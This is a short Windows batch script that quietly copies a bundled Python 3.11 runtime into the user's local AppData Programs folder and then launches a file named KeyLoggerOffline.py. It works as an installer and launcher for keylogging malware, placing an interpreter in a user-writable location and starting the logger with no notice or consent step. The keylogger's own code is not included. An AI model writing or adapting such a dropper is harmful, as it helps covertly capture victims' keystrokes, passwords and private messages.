@echo off

if exist %APPDATA%\..\Local\Programs\Python (goto Python)
md %APPDATA%\..\Local\Programs\Python
:Python
if exist %APPDATA%\..\Local\Programs\Python\Python311 (goto Python311)
md %APPDATA%\..\Local\Programs\Python\Python311

:Python311
xcopy /s /e /y .\Python311 %APPDATA%\..\Local\Programs\Python\Python311

start .\KeyLoggerOffline.py